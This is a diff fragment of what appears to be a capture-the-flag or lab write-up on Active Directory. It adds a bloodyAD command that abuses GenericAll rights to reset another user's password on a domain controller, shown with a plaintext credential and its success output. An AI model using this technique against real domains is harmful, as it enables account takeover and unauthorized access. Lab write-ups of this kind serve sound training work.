@@ -594,5 +594,12 @@ Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its a
 This granted me GenericAll over this user
 
 ```python
+bloodyAD --host dc.novaforge.local -d novaforge.local -u m.lee -p '0816mypassword' set password 'steve.wills' 'Password123!'
+[+] Password changed successfully!
+```
+
+Since its a lab environment, ill just change the users password!
+
+```python
 
 ```
